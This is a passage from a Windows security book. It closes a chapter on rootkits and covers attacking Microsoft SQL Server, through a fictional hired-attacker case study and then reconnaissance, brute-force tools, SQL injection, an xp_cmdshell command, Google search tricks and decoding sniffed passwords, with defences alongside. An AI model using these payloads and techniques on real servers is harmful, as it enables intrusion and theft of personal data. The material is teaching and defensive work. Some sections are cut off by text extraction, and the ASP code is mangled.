Windows? Because prior to Windows  Vista,  there  was  no  built-in  way  to  enumerate  the  ADSs  associated  with  a  file.  On  Windows 2000 and Windows XP, if you wanted to list all of the ADSs associated with a  file, you had to use a utility such as Streams 1.55 to accomplish this task. In Vista, the  R switch has been added to the DIR command to enumerate streams associated with a file  or folder.  SUMMARY  Stealth software has been around for a long time, and will continue to exist well into the  foreseeable future. Modern stealth software comes in many forms, ranging from simple  user-mode rootkits, to advanced kernel-mode rootkits, to rootkits that load from boot  records  of  CDs,  to  hypervisor-based  rootkits  that  move  the  operating  system  into  a  virtual machine to achieve stealth. Typically, the earlier in the boot process that a rootkit  can load and the deeper into the OS that a rootkit can hook, the harder it will be to detect  and or remove. For these reasons, we need to keep untrusted malicious code out of the  operating system kernel. Some operating systems such as the 64-bit version of Windows  Vista attempt to keep all code, except drivers signed using certificates issued by trusted  certificate authorities, out of the kernel and to prevent signed code from attempting to  patch or modify functions and data structures in the kernel’s memory space. In addition,  most rootkits need Administrator privileges to achieve stealth and persistence, so logging  in with standard user accounts is more important now than ever, a task that is facilitated  by Vista’s User Account Control.   Chapter 8:  Achieving Stealth and Maintaining Presence   269  In recent years, many very effective rootkit detection tools have been created largely  in  response  to  the  challenge  posed  by  well-written  stealth  software.  There  are  still  numerous ways to detect many common rootkits without having to rely on specialized  software, and they usually involve discovering or detecting something that the rootkit  author  forgot  to  hide  or  is  not  capable  of  hiding.  Some  forms  of  stealth,  due  to  the  techniques used, are inherently tricky to implement properly and can cause instability  that can lead to operating system or application crashes on heavily used machines or  machines  with  multiple  processors.  Operating  system  and  application  instability  combined with powerful rootkit detection tools can lead to quick and easy identification  of a rootkit, thereby defeating the rootkit’s ability to achieve stealth. For these and other  reasons, some malicious hackers choose not to use stealth technology at all, and instead  attempt to camouflage their malware or to blend in with the surrounding environment  in an attempt to go unnoticed.  “A strange game.

We’ve all seen the headlines in the past few   years:  hackers  breaking  into  university  sites,  online  merchant  sites,  and  government application sites and using the data for nefarious purposes. Of  course,  this  was  inevitable.  Defacements  are  a  lousy  way  to  make  money—and  information theft is very profitable. With huge penalties for information disclosure and  substantial rewards for attackers, databases are more at risk than ever.  For  those  companies  utilizing  Microsoft  technologies,  a  popular  data  store  is  Microsoft’s SQL Server relational database as well as the various free editions of SQL  Server  Microsoft Data Engine, which has now been renamed SQL Server Express Edition  in SQL 2005  that ship with more than 240 known software packages. SQL Server has  been very prolific and now appears to have market share of about 23 percent according  to Gartner  www.gartner.com  estimates. Unfortunately, despite all of the concerns about  scalability and reliability that most companies have when planning and implementing  SQL Server, they often overlook a key ingredient in any stable SQL Server deployment:  security. It’s a common tragedy that many companies spend a great deal of time and  effort protecting the castle gates while leaving the royal vault wide open.  As the SQL Slammer worm  www.cert.org advisories CA-2003-04.html  taught us,  other potential repercussions are possible when SQL Server security is neglected. When  a six-month-old SQL Server vulnerability can nearly bring the Internet to its knees, two  things become obvious: there are a lot of SQL Server installations out there, and no one  seems to be keeping them properly secured.  In  this  chapter,  we  outline  how  attackers  footprint,  attack,  and  compromise  SQL  Server, followed by solutions for mitigating these threats. We begin with a case study  outlining common attack methodologies, followed by a more in-depth discussion of SQL  security concepts, SQL hacking tools and techniques, and countermeasures. We continue  detailing the technologies, tools, and tips for making SQL Server secure.  It has been shown that insecure applications have exposed otherwise well-secured  SQL Server installations. Applications that use SQL Server as a back end can be attacked  via SQL injection, whereby attackers can go directly at your data virtually undetected in  many cases. We pay special attention to how this is done and what you can do to protect  your assets.  CASE STUDY: PENETRATION OF A SQL SERVER  Jade had already spent half on her advance money and she had not even fired up her  laptop. As a hired mercenary, she was given only the minimum amount of information  she needed to complete the contracted job: break into a mortgage broker’s website and  obtain any leads generated in the last six months. She wasn’t sure who had contracted  the job but mused it was probably a sleazy competitor.  She had at least completed some recon before accepting the job. She checked out the  company’s website and found a public portal focused mostly on new sales. This portal  provided customers with information about their products and allowed individuals to  enter their private information, after which the software presented them with various    Chapter 9:  Hacking SQL Server   275  loan packages and directed them to a local broker. She could find nothing exploitable on  the public site and assumed it had received a great deal of scrutiny.  Jade had also learned of a sales portal that was used by internal employees. Based on  what  Jade  knew,  the  sales  portal  looked  like  the  better  target.  Internal  systems  never  seem to get the same security scrutiny as public-facing systems, and a sales portal was  more likely to have the historical data she needed. However, there was one hitch: she  could find no reference to the actual location of this portal.  With only a few days left on her contract, Jade decided it was time to get creative.  One of the large regional branches for this company was local to her, so she grabbed a  wireless  laptop  and  headed  to  the  closest  coffee  shop  to  the  target.  Sure  enough,  she  found  a  large  establishment  in  their  building  offering  free  wireless  Internet  access  to  anyone willing to pay five dollars for a mochaccino. She was hopeful that a company  employee with a poorly configured laptop would come in for a break.  She loaded her favorite wireless sniffer, Aeropeek, and waited for her lucky break.  Each  time  she  saw  a  new  wireless  client  appear,  she  quickly  scanned  the  machines  looking for opportunities. Since the release of Windows XP SP2, most Windows machines  had the firewall enabled by default, but people had a bad habit of adding exceptions  when the firewalls inconvenienced them in some way. Such was her fortune today.  She eventually found a laptop with TCP port 1433 listening and it was communicating  over an encrypted channel  probably a VPN  for all communications, so she could not  see where it was browsing. A listening SQL Server on a laptop usually meant one of two  things: this is a developer or a salesman with a local sales database. She immediately  fired up sqlcmd  a command-line SQL Server client  and attempted a connection using  SQL authentication as the sa user with no password:  Login Failed for user 'sa'  There was no mention of this user not being associated with a trusted SQL Server  connection. Excellent! She was dealing with a SQL Server in SQL authentication mode,  which  meant  she  could  make  a  brute-force  attempt  for  access.  She  quickly  loaded  SQLPing3, pointed it to the target IP address, and loaded her favorite password list. She  made sure to add a few items specific to this target: company name, regional office name,  mortgage  lingo,  and  assorted  acronyms  from  the  website.  In  3  seconds  she  got  a  hit:  commission was the password. It was looking more and more like this was her lucky day. Trembling  with  excitement,  she  invoked  the  SQL  Server  Management  Studio   the  instance was SQL Server 2005  and connected to the victim. She found multiple databases,  including one that appeared to contain sales leads. She quickly used a series of SELECT statement  to  download  all  the  data  to  her  local  machine,  but  her  victorious  mood  dampened when she saw that the data was more than a year old. Apparently, this was an  old client-server application that was no longer in use. Quickly, Jade recovered and thought of another tactic. Since she was logged in as the  sa account and thus had SQL Server system administrator privileges, she used the xp_ cmdshell  luckily, it was enabled on the server  command to check the user profiles for  browser history and cookies like so: xp_cmdshell 'dir C:\Documents and Settings\user\cookies'   276   Hacking Exposed Windows: Windows Security Secrets & Solutions   After combing through a barrage of time-wasting websites, she finally noticed one  that stood out. This site was visited daily and the URL led her to believe that she had  found the sales portal! Time for the kill. Unfortunately, all the cookies for the sales portal  had expired, or she could have simply stolen the cookie and logged in as this user. No  problem; she always had better luck with the direct assault anyway.  Jade fired up her favorite application scanning tool, Paros Proxy, so that she could  clearly see the raw data being returned back and forth on her requests. She then configured  her browser to use the default Paros Proxy port 8080. Jade immediately pulled up the  sales portal page. She could tell by viewing the raw requests in Paros that the server was  claiming to be a Microsoft server running Internet Information Server. Also, the pages  had  .aspx  extensions,  implying  they  were  coded  in ASP.NET.  She  instructed  Paros  to  “spider” the site, which would follow all links and give her a list of all accessible pages.  Unfortunately, since the site required authentication, only the login page was found.  Undeterred, she instructed Paros to perform a scan, and it wailed on the server for  several minutes, diligently performing the analysis. It returned a single anomaly; a “SQL  Injection  Fingerprinting”  vulnerability  on  the  login  page  in  the  password  field.  To  validate the finding, she tried logging into the site with a single quote as the password to  see if the SQL code behind the page would be corrupted: Username: admin Password: '  Sure enough, she pressed the submit button and the page returned this: Microsoft OLE DB Provider for ODBC Drivers error '80040e14' [Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark  before the character string '''.  checkLogin.asp, line 10  She was in business—or so it appeared. Her first instinct was to attempt to “short- circuit” the probable query behind the login screen so she could log into the site and  access the information she needed. Quickly, she assembled some exploit code and made  another attempt: Username: admin Password: ' or 1=1—  Success! She was logged directly into the sales portal and quickly began searching for  the data she needed. After a few minutes, though, it was obvious that her search had  only begun. The sales portal showed only leads from the last three months. The interface  did not allow the user to view older leads, probably leaving this to some archiving tool  or data warehouse.

She loaded a tool called Absinthe, which    Chapter 9:  Hacking SQL Server   277  would allow her to pull all of the data from the database  assuming the SQL account had  the  rights   using  blind  SQL  injection. Absinthe  quickly  identified  the  version  as  SQL  Server 2005, and she began the process of downloading the entire database. Jade was  careful to download the data quietly by coordinating her Absinthe exploits with peak  traffic periods, such as morning logins and other daytime activities, to avoid gaining the  attention of any network security analysts.  The  download  would  take  hours  or  days  to  complete,  but  in  the  end,  she  was  confident she would finish another job just under the wire. She smiled playfully as she  closed her laptop and slipped back out of the building to catch a cab.  SQL SERVER SECURITY CONCEPTS  Before we delve into the innards of SQL Server security, let’s discuss some of the basic  concepts and address some of the areas that have improved over the years. SQL Server  was originally developed with assistance from Sybase for IBM’s OS 2. When Microsoft  decided to develop its own version for NT, SQL Server 4.2  also known as Sybase SQL  Server  was born. Shortly thereafter, Microsoft bought the code base and developed SQL  Server 6.0 without Sybase. Since that time, through several revisions and improvements,  SQL Server has transformed into quite a different product than was originally developed  during the Sybase days. However, as you will see, Microsoft still retains many pieces  under the hood from the original security model, and many of those continue to hinder  the product to this day.  Network Libraries  Network libraries  netlibs  are the mechanisms by which SQL clients and servers exchange  packets of data. A SQL Server instance can support multiple netlibs listening at one time,  and  since  SQL  Server  2000,  it  supports  multiple  instances  of  SQL  Server  at  once—all  listening on different netlibs. By default, TCP IP is enabled and listening for all SQL  Server  2005  installations  except  for  Express  Edition,  where  only  the  Shared  Memory  network library is enabled. This means that the typical SQL Server install can be easily  spotted by a port scan of the default TCP port of 1433.  Netlibs supported by SQL Server 2005 include the following:     TCP IP    Named Pipes    Shared Memory  local server only     Virtual Interface Architecture SAN  SQL  Server  2005  has  enhanced  the  connection  security  by  allowing  the  ability  to  enforce encryption on all network libraries. The exception is Shared Memory, where it  would not make sense because the connection is local to the server.  Although  Microsoft  has  included  many  encryption  mechanisms  into  the  network  library stack, the platform transport security mechanisms such as IPSec, port filtering,    278   Hacking Exposed Windows: Windows Security Secrets & Solutions   and Windows Firewall should not be overlooked. For example, combining the encryption  capabilities  of  the  TCP IP  network  library  with  Windows  Firewall  can  provide  both  privacy and minimized surface area to your SQL Server installation.  Security Modes  SQL Server has two security modes:     Windows Authentication mode    SQL Server and Windows Authentication mode  mixed mode   In Windows Authentication mode, Windows users are granted access to SQL Server  directly  using their Windows passwords  and thus there is no need to create a separate  login  in  SQL  server  for  that  user.  This  can  greatly  aid  in  administration,  because  administrators have no need to create, update, or delete users constantly within SQL  Server. This mode is Microsoft’s officially recommended security mode and is now the  default mode.  To  connect  to  a  SQL  server  using  Windows  Authentication,  use  the  following  connection string if you are using the OLE Database  OLE DB  provider for SQL Server: "Provider=SQLOLEDB;Data Source=my_server;Initial Catalog=my_database; Integrated Security=SSPI "  In SQL Server and Windows Authentication mode, users can also be authenticated  by  a  username password  pair  with  the  credentials  stored  within  SQL  Server  itself.  Although this is no longer the default security mode, it is still a common mode due to the  simplicity of the security model and the fact that many web developers find it easier to  code for this model than to worry about Windows Authentication complexities.  To connect to a SQL server using native logins, use the following sample connection   string if you are using the OLE DB provider for SQL Server: "Provider=SQLOLEDB;Data Source=my_server;Database=my_database; User Id=my_user;Password=my_password;"  Logins  A login in the SQL Server world is an account that gives you access to the server itself. All  SQL Server logins are kept in the sysxlogins table  which is available only through the  syslogins  view  in  SQL  2005   in  the  master  database.  Even  when  using  Windows  authentication, either a security identifier  SID  for the user or group-granted access is  stored.  For  native  SQL  Server  logins,  a  16-byte  globally  unique  identifier   GUID   is  generated and placed in the SID column. Passwords for native SQL Server accounts are  stored in this table in encrypted form.  With SQL Server 2005 installed on Windows 2003 Server, Microsoft added the ability  for  SQL  Server  login  accounts  to  have  lockouts,  password  complexity,  and  password    Chapter 9:  Hacking SQL Server   279  expiration. This is a huge breakthrough and helps to mitigate some of the weaknesses  inherent in the SQL Server login security model.  A user is a separate type of account that is linked to a particular login and used to denote  access to a particular database. Users are stored in individual databases in the sysusers  table  implemented as a view in SQL Server 2005 . Only users are assigned access to  database  objects.  No  passwords  are  stored  in  the  sysusers  table,  as  users  are  not  authenticated like logins. Users are simply mapped to a login, so the authentication has  already occurred.  Users  Roles  As a convenience to administrators and as a security feature, users and logins can be  assigned to fixed or user-defined database roles to keep from having to manage access  control individually and also to partition special privileges. Roles come in the following  flavors:     Fixed server roles  sysadmin, serveradmin, securityadmin, and so on     Fixed database roles  db_owner, db_accessadmin, db_securityadmin, and so on     User database roles    Application roles  sp_setapprole   Fixed  server  roles  provide  special  privileges  for  server-wide  activities  such  as  backups, bulk data transfers, and security administration. Fixed database roles let trusted  users perform powerful database functions such as creating tables, creating users, and  assigning permissions. User database roles are provided for ease of administration by  allowing users to be grouped, with permissions assigned to those groups. Application  roles allow the SQL DBA to give users no privileges in the database at all, but instead  users must use the database through an application that lets all users share an account  for the duration of the application. This role is used mostly to keep users from directly  accessing the SQL server outside of an application  via Excel, Access, or other means .  Logging  Unfortunately,  authentication  logging  in  SQL  Server  has  been  traditionally  relatively  weak.  Failed  login  auditing  is  now  enabled  by  default  on  SQL  Server  2005,  but  once  enabled  it  logs  only  the  fact  that  a  failed  login  occurred  for  a  particular  account.  No  advanced information is supplied about the source application, hostname, or netlib, or  any other information that might be useful in determining from whence an attack was  being launched. However, beginning with SQL Server 2005, the IP address of the failed  login remote host is logged. See Figure 9-1 for an example of the logged data during a  brute-force attack.   280   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 9-1  SQL Server error log during a brute-force attack  SQL Server includes a C2 logging feature. Unfortunately, C2 logging still does not  provide network details of a potential attacker, but it does have the ability to log the  details of all data changes within SQL Server. If you have some serious disk space and  can  hold  this  level  of  information   and  it  is  a  lot  of  information ,  C2  auditing  can  be  enabled using the following commands in Transact-SQL  T-SQL : exec sp_configure 'C2 Audit Mode',1 go reconfigure go  SQL Server 2005 Changes  With the release of SQL Server 2005, Microsoft has addressed many of the security issues  that have plagued administrators in the past. On the flip side, not all of the new features  are good for security, and each should be scrutinized closely before implementation. Table  9-1 shows some of the changes in the latest release that affect security in a significant way.

HACKING SQL SERVER  Until the SQL Slammer worm was unleased in January 2003, Microsoft had mostly received  a black eye from the various IIS vulnerabilities, with SQL Server staying somewhat beneath  the radar screen. This is not to say that SQL Server has not had its share of exploits—rather,  it has not received quite the press or attention from the hacking community. Perhaps it is  due  to  the  relatively  few  automated  SQL  Server  patching  tools  currently  available.  Or  perhaps it is because some cursory knowledge of SQL is required to attack SQL successfully,  raising the bar somewhat above the simple HTTP tricks that are so often the root of IIS    282   Hacking Exposed Windows: Windows Security Secrets & Solutions   exploits. However, tools are beginning to appear and attackers are beginning to realize that  learning a little SQL can go a long way toward prying into corporate data stores. The time  has come to take notice of SQL Server security and what we can do to protect our most  valuable resources. This section should serve as your wake-up call!  SQL Server Information Gathering  Most experienced attackers will take the time to gather as much information about a  potential target as possible before making any direct moves. Their purpose is to make  sure that the actual penetration attempt is focused on the right technologies and doesn’t  alert  intrusion  detection  systems  by  being  overly  sloppy.  In  addition  to  the  obvious  places, such as the target’s public website  which usually yields gems such as job openings  for the various disciplines  or the various domain name registries, attackers can usually  harvest a wealth of information about most targets in a matter of minutes from some of  the following sources.  No  matter  how  good  a  developer  you  might  be  or  how  many  years  you’ve  been  administering Microsoft servers, you’ll invariably need help somewhere down the road.  Chances  are  the  first  place  you’ll  go  to  get  some  of  that  help   before  you  burn  some  Microsoft  Support  points   is  the  newsgroups.  In  asking  others  for  help,  you  may  inadvertently  be  divulging  valuable  details  about  the  types  of  technologies  used  in- house,  the  skill  levels  of  those  involved,  and  possibly  even  security  details  such  as  ActiveX data object  ADO  connection strings and SQL Server security mode settings.  Newsgroup Searches  Popularity: Simplicity: Impact: Risk Rating:  Google Hacking  Popularity Simplicity: Impact: Risk Rating:  9 9 4 7  7 8 6 7  A common place to find such details is search engines and newsgroup repositories  such as www.google.com, where you can perform detailed searches on potential targets.  A common tactic is to identify all messages posted by users with a specific domain name,  and then focus on articles that appear to contain detailed technical information about  database types, security settings, or specific application security issues.  If someone from your company has a newsgroup posting concerning SQL Server, it  should surface. Take a look at the messages and see what kind of information is floating    Chapter 9:  Hacking SQL Server   283  out  there  for  potential  attackers.  Other  potentially  dangerous  information  on  Google  includes  connection  strings,  hidden  form  fields,  vulnerable  sample  web  pages,  and  administration pages that the search engines were kind enough to catalog and index for  potential attackers. Also, since Google is constantly checking sites for new content, it can  be leveraged as a quick way for attackers to scour your site for private data.  Try this with your company:         1.  Navigate to the www.google.com web page. 2.  In the search box type site:yourdomain.com ﬁ letype:inc 3.  Click Search.  If your site uses include files to store connection strings or other data, attackers can  quickly find this information. Most any file type  .doc, .xls, .pdf, and so on  can be queried  in this manner to divulge source code or other private content. Be especially wary of text  editors  that  save  backup  copies  of  your  web  applications  files. A  web.config.bak  file  could  inadvertently  divulge  your  site’s  connection  strings,  session  keys,  and  other  precious secrets.  We are not discouraging anyone from using newsgroups or help forums or telling you to be afraid of  Google, but you should consider that whatever you post may exist forever and can be seen by anyone  at any time. Knowledge can be used for evil as well as good. Assume all content located on your  anonymous access web servers is readable by anyone. Just because you don’t think anyone links to  the content does not mean it is safe.  Port Scanning  Popularity: Simplicity: Impact: Risk Rating:  10 10 6 8  Port scanning has become so common that most security administrators have neither  the time nor inclination to investigate every port scan that comes across the firewall logs.  Hopefully, if the firewall is properly configured, a port scan will yield little fruit for the  attacker. However, in many cases, security administrators will leave SQL Server ports  open  for  developers  or  remote  employees  to  access  customer  relationship  databases.  This tragic mistake can be a boon for aspiring SQL Server hackers, and you can bet your  bottom dollar they’ll be looking for it.  A SQL Server scan begins with a sweep of TCP port 1433 for all the IP addresses  assigned to the victim. Port 1433 is the default listening port for a SQL server listening on  the TCP IP sockets netlib and is generally proof-positive of a SQL Server installation,  since this netlib is installed by default on most all SQL Server editions. If you see sweeps  of port 1433 on your border router or firewall logs, you can bet someone is attempting to  locate SQL servers in your organization.   284   Hacking Exposed Windows: Windows Security Secrets & Solutions   It should be noted that since Windows XP SP2 the Windows Firewall has been on by default, limiting  the  number  of  exposed  developer  workstations  and  other  low-profile  installations.  However,  since  users  can  easily  create  exceptions  to  allow  for  inbound  SQL  Server  connections  you  should  not  assume that this is not a significant threat. Active Directory has some excellent settings for locking  down  Windows  Firewall  and or  IPSec  settings  on  domain  member  computers  and  it  is  highly  recommended that these settings be used to prevent unnecessary exposure.  SQLPing Popularity: Simplicity: Impact: Risk Rating:  8 10 5 8  Another  information-gathering  technique  is  the  use  of  the  SQLPing  tool  by  Chip  Andrews. Since SQL Server supports multiple instances, it is necessary for the server to  communicate to the client the details of every instance of SQL Server that exists on that  server. This tool uses the discovery mechanisms inherent in SQL Server  since SQL 2000   to query the server for detailed information about the connectivity capabilities of the  server and displays it to the user. The SQL Resolution Service, or SQL Browser Service as  it is now called, operates over UDP 1434. Queries can be sent as broadcast packets to  specific  subnets  so  that  in  many  cases,  where  firewall  security  is  lax,  it  is  possible  to  query entire subnets with a single packet!  A sample SQLPing request that discovered two instances on a single host looks like   this: C:\tools>sqlping 192.168.1.255 SQL-Pinging 192.168.1.255 Listening.... ServerName   : POPEYE InstanceName : MSSQLSERVER IsClustered  : No Version      : 8.00.194 np           : \\POPEYE\pipe\sql\query tcp          : 1433  ServerName   : POPEYE InstanceName : SQL2005 IsClustered  : No Version      : 9.00.2047.00 tcp          : 2296  As you can see, a SQLPing response packet contains the following information:     SQL server name    Instance name  MSSQLServer is the default instance    Chapter 9:  Hacking SQL Server   285     Cluster status  Is this server part of a cluster?     Version  returns only base version, but it’s easy to identify SQL Server 2000   versus 2005 installations      Netlib support details  including TCP ports, pipe names, and so on   In fact, you’ll find that even if a cautious administrator has changed the default TCP  port of a SQL server listening on TCP IP sockets, an attacker using SQLPing can easily  ask the server where the port was moved. The information gleaned from SQLPing can  also identify particularly juicy targets, such as those that use clustering technology for  high  availability—and  such  systems  are  usually  mission-critical. All  this  information  leakage helps attackers and could spell disaster for your SQL Server installation if it falls  into the wrong hands. The obvious defense against this tool is to block UDP 1434 inbound  to your SQL servers or to disable the SQL Browser Service  which has been possible since  SQL Server 2005 .  SQLRecon SQLPing was an excellent tool for finding SQL Server 2000 installations, but it worked  only in certain environments. What if a firewall was blocking UDP 1434? What if SQL  Server  2005  was  installed  and  the  SQL  Browser  Service  was  disabled?  What  if  the  MSSQLServer  service  was  set  for  manual  startup  and  not  running  at  the  time  of  my  scan? All of these scenarios resulted in false negatives. Since other means of detection  were available, Chip Andrews decided to combine all of those methods into a tool called  SQLRecon  Figure 9-2 .  SQLRecon  can  detect  SQL  Servers  under  a  variety  of  conditions  and  states.  For  example,  if  you  didn’t  care  about  alerting  the  hosts  of  an  active  scan,  the  following  detection methods are available:     SQL Server Resolution Browser Service  UDP 1434 like SQLPing     Windows Registry    Windows Management Instrumentation  WMI     TCP Scan    Service Control Manager    Forced login attempt  in case of non-TCP IP protocol   In addition, if your scan needed to be a bit more discrete, you have a choice of two   “stealth” options that do not directly contact the target hosts:     Browser Service    Active Directory  SQLRecon requires the .NET Framework for execution on the host. It is not required   to be installed on any target machines.   286   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 9-2  SQLRecon uses multiple methods to ﬁ nd SQL servers on a network.  SQL Server Hacking Tools and Techniques  Once  SQL  Server  has  been  found  on  a  network,  hackers  can  use  common  tools  and  techniques  to  bring  it  to  its  knees,  security-wise.  This  discussion  is  divided  into  two  parts, the first covering basic SQL querying utilities and the second covering serious SQL  hacking tools. It ends with a section on sniffing SQL Server passwords off the network. Basic SQL Query Utilities Several tools either ship with the official SQL Server utility suite or are available via free,  downloadable versions with most of the same functionality. They are designed to perform  straightforward queries and commands against SQL, but like most legitimate software,  they can be used to great effect by attackers. Over the years Microsoft has often changed  the  names  of  the  various  tools  that  come  with  SQL  Server,  leading  to  a  great  deal  of  confusion. To make this text more readable, we are using only the latest names for these  tools, but this table should allow you to correlate the tool names based on the SQL Server  version you are using.   Chapter 9:  Hacking SQL Server   287  SQL Server 2005 Management Studio  SQL Server 7 2000 Enterprise Manager and  Query Analyzer  sqlcmd  osql isql  Conﬁ guration  Manager Database Engine  Tuning Advisor SQL Server Express  Edition  SSEE   Client Network Utility and  Server Network Utility Used to be part of Query  Analyzer Microsoft Data Engine   MSDE   Description Primary management and  development tool for SQL  Server Command-line interface for  running SQL queries Tool for conﬁ guring client  and server network libraries Tool for automated  performance analytics Free version of the SQL  Server database engine  limited to 2GB per database  SQL Server Management Studio  Released with SQL Server 2005, the latest GUI client tool for  SQL Server is the SQL Server Management Studio. This tool is the successor to the Query  Analyzer and Enterprise Manager tools that existed in previous SQL Server versions.  Usage  of  this  tool  is  self-explanatory,  but  it  is  worth  mentioning  in  that  a  freely  available version of this tool is likely to make it quite ubiquitous. The Express Edition of  the  SQL  Server  Management  Studio   Figure  9-3   can  be  downloaded  directly  from  Microsoft. It can manage a database engine from any edition of SQL Server 2005 but does  not  work  on  Analysis  Services,  Integration  Services,  Notification  Services,  Reporting  Services, SQL Server Agent, or SQL Server 2005 Mobile Edition.  sqlcmd Life would be too easy if everything were accomplished with graphical point- and-click tools, so we thought we’d mention that, yes, the official Microsoft SQL client  utility  suite  comes  with  a  command-line  tool  called  sqlcmd.exe.  Sqlcmd  is  freely  downloadable from Microsoft and is located in the SQL Server 2005 Feature Pack. It does  require Microsoft SQL Server Native Client be installed, but, as luck would have it, that  is also included in the Feature Pack.  Sqlcmd allows you to send T-SQL statements, stored procedures, and script files to a  target server. Thus, for all intents and purposes, it acts much like a command-line version  of Management Studio that is highly scriptable. Type sqlcmd -? at a command prompt  for a syntax reference.  Prior to SQL Server 2005, the command-line tool for SQL Server was called osql.exe and was included  in all editions of SQL Server.  Advanced SQL Hacking Tools What tools and techniques might an attacker use to gain access to your servers? We can  almost guarantee it’s not going to be one of the aforementioned unless the attacker is a  masochist  or  extremely  new  to  the  game.  Experienced  attackers  soon  find  ways  to  automate their exploits to identify low-hanging fruit and get out of the orchard quickly.   288   Hacking Exposed Windows: Windows Security Secrets & Solutions   Figure 9-3  SQL Server Management Studio Express is freely available and ubiquitous.  While not as prolific as the myriad of choices that exists for hacking Windows Server  or IIS, some tools are designed specifically for going after SQL Server. Most of these tools  are small enough to make excellent additions to the attacker’s  or security professional’s   toolkit  when  attacking  hapless  unpatched  IIS  servers.  Since  many  IIS  servers  act  as  middleware between the client and the  hopefully  firewalled SQL server, a compromised  IIS server is the perfect launching pad for an attack on the mother of all web conquests— data. Let’s take a look at some of the tools of the trade in SQL Server hacking.  SQLPing 3  SQLPing 3 combines the scanning techniques found in SQLRecon with a brute- force SQL Server password-breaking utility. This is a good bet for auditing entire subnets  of SQL Server passwords in your organization since it supports IP ranges and IP lists.  SQLPing 3 illustrates, in Figure 9-4, that most anyone can now attack exposed SQL  servers without the slightest knowledge of netlibs, connection strings, or special client  software. SQL hacking is now a point-and-click operation, and if even one server in your  organization is exposed, a breach occurring in your organization is a matter of when and    Chapter 9:  Hacking SQL Server   289  Figure 9-4  SQLPing 3 allows you to scan for SQL servers and perform brute-force attacks.  not  if.  SQLPing  3  was  designed  for  security  professionals  for  the  purpose  of  self- auditing—not as a hacking tool—although it certainly could be used as such.  sqlbf This SQL Server password brute-forcing tool by xaphan uses wordlists, password  lists, and IP address lists to help the efficient SQL hacker spend time on more interesting  pursuits while your servers are brought to their knees. Sqlbf also gives the hacker the  option of using a named pipes connection for its attack, but it should be noted that this  will initiate a Windows NetBIOS connection and will be subject to logging as well as  standard SQL Server logging  if it is enabled . Sqlbf can be used as follows: C:\>sqlbf Usage: sqlbf [ODBC NetLib] [IP List] [User list] [Password List] ODBC NetLib : T - TCP IP, P - Named Pipes  netBIOS  IP list - text file containing list of IPs to audit User list - text file containing list of Usernames Password List - text file containing list of passwords  This tool is not only useful for breaking the sa account password, but it can ferret out  other accounts that might contain system administrator privileges and may be somewhat  less protected. We keep a long user list that contains not only sa but also usernames such  as test, admin, dev, sqlagent, and other common names that may have appeared during  some phase of development and were then forgotten.   290   Hacking Exposed Windows: Windows Security Secrets & Solutions   Some of the more popular account names for a SQL server include these:    sa    sql_user    sqluser    sql    sql-user    user    sql_account  Use your imagination from this point on. Don’t forget to try company name variations as  well as application names if you’re privy to that information. Note that this tool does not  work with multiple instances, since it asks only for IP address and not server name or  TCP port.  sqlpoke For the aspiring SQL Server hacker who prefers the shotgun approach, there is  sqlpoke, also by xaphan. This tool makes no attempt to break sa account passwords but  instead looks for SQL servers where the password is blank. When a SQL server is found  with a blank sa account password  a frighteningly common occurrence for a variety of  reasons , it executes a predefined script of up to 32 commands. This allows a potential  attacker to premeditate the intrusion to include possibly TFTP-ing a toolkit and executing  a Trojan or whatever is desired in bulk fashion.  Note that sqlpoke also gives the user the ability to select a custom port. In addition,  the tool is limited to scanning a Class B IP-network range at the largest. This tool should  strike fear into the hearts of those who continually use blank sa account passwords so  that  lazy  developers  need  not  be  bothered  with  asking.  We  can  imagine  hundreds  of  compromised servers resulting from running the following example: Sqlpoke 10.0.0.0 10.0.254.254 1433  script to alert hacker and install Trojans   Sleep tight!  Custom Web  Pages  Sometimes  attackers  would  prefer  not  to  scan  directly  from  their  personal machines, but instead make patsies out of previously compromised hosts to do  their dirty work. One method for doing this is to design a custom Active Server Pages   ASP  page on a sufficiently compromised host or a free-hosting service to perform their  hacking. The beauty of this approach is that the attacker can perform penetrations of  other systems while making the ASP-hosting system look like the guilty party.  All an attacker needs to do to perpetrate this attack is build a custom ASP page that  invokes Microsoft’s ActiveX data objects. Using ADO, the attacker can specify the type of  driver to use, username, password, and even the type of netlib required to reach the target.  Unless the ISP is performing some level of egress filtering, the server on which the ASP  page  is  running  should  initiate  the  desired  connection  and  provide  feedback  to  the  attacker. Once a compromised host is found, the attacker is free to issue commands to  the victim through the unwitting accomplice host.  To demonstrate, Figure 9-5 shows a sample ASP SQL Server scan, which uses the   following source code to scan an internal network:   Chapter 9:  Hacking SQL Server   291  <% <Rresponse.buffer = true Server.ScriptTimeOut = 3600 %>\>      SQL Server Audit Results       SQL Server Security Analysis   Scanning.....

The point is that the SQL client tools are lightweight and ubiquitous.  Never assume an attacker’s only weapons are the tools that come bundled with SQL  Server.  The potential SQL Server hacker has no shortage of tools and technologies to help  him complete his task. On top of all of this, keep in mind that SQL Server has weak  logging  slightly improved in SQL 2005 since we now have the remote IP address , and  even if you do somehow notice a brute-force attack is occurring on your server, the SQL  Server logs will provide little useful information. Make sure you take the time to test  these tools against your servers before the bad guys do.  Packet Snifﬁ ng SQL Server Passwords Microsoft has seen fit to include SSL support for all types of connectivity in its products,  with good reason. Without encryption, a user authenticating using native SQL Server  logins is transmitting her password in cleartext over the network. If you’ve ever used a    Chapter 9:  Hacking SQL Server   293  packet sniffer to monitor communications between a client and server, you may have  been disappointed to see your password whizzing over the wire for all to see.  As  you  can  see  in  Figure  9-6,  an  attempt  was  made  to  log  in  as  user  sa,  but  the  password  seems  to  be  somewhat  scrambled  after  that.  However,  take  a  look  at  the  pattern. Every other byte in the sequence is an A5  hex . You should be suspicious by  now that something less than encryption is happening here—and you’d be right. Rather  than keeping you in the dark, we’ll spill the beans and show that there is nothing going  on here but a simple XOR scheme to obfuscate the password.  Let’s  start  by  breaking  down  the  password  a  byte   and  bit   at  a  time.  The  first  hexadecimal  digit   A,  for  example   is  equivalent  to  the  1010  in  binary.  To  obtain  the  password, we simply swap the first and second hex digit of each byte  this is due to  Unicode encoding  and XOR the binary representation of the password with 5A  yes,  that’s A5 in reverse . The resulting computation will reveal the hex representation of the  real password, as Table 9-2 shows.

